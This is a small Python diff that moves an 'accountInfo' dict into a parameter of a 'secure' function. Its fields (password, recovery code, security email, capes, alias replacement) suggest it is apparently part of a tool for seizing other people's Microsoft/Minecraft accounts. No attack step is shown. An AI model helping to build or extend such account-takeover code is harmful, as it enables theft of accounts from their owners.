@@ -29,26 +29,9 @@ import json
 ralias = json.load(open("config.json", "r+"))["autosecure"]["replace_main_alias"]
 database = DBConnection()
 
-async def secure(session: httpx.AsyncClient, recovery: bool):
+async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
 
     apicanary = await getCookies(session) 
-
-    accountInfo = {
-        "name": "Could not find",
-        "email": "Couldn't Change!",
-        "security_email": "Couldn't Change!",
-        "password": "Couldn't Change!",
-        "recovery_code": "Couldn't Change!",
-        "status": "Unknown",
-        "SSID": False,
-        "firstName": "Failed to Get",
-        "lastName": "Failed to Get",
-        "fullName": "Failed to Get",
-        "region": "Failed to Get",
-        "birthday": "Failed to Get",
-        "method": "Not purchased",
-        "capes": "No capes"
-    }
     
     T = await getT(session)
 
